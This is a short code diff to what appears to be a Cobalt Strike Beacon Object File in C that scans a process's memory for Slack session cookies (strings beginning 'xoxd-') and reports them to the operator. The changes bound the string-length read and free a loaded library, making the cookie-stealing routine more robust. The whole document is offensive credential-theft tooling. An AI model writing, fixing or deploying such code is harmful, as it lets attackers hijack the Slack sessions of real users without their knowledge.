@@ -88,11 +88,12 @@ void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz)
     //for (index = 0; index < (address_sz/2)-8; index++)
     for (index = 0; index < address_sz-5; index++)
     {
+        size_t remainingSize = address_sz - index;
         // search for xoxd- [78 6f 78 64 2d] 
         if (buffer[index] == 0x78 && buffer[index + 1] == 0x6f && buffer[index + 2] == 0x78 && buffer[index + 3] == 0x64 && buffer[index + 4] == 0x2d)
         {
             BeaconPrintf(CALLBACK_OUTPUT, "Slack Cookie: %s", buffer + index);
-            index += MSVCRT$strlen((char *)(buffer + index)) - 1;
+            index += MSVCRT$strnlen((char *)(buffer + index), remainingSize) - 1;
         }
     }
 END:
@@ -164,6 +165,10 @@ void GetProcessMemory( HANDLE hProcess )
         intFree( mem_info );
     } while(1);
 END:
+    if (KERNEL32)
+    {
+        FreeLibrary(KERNEL32);
+    }
     return;
 }
 
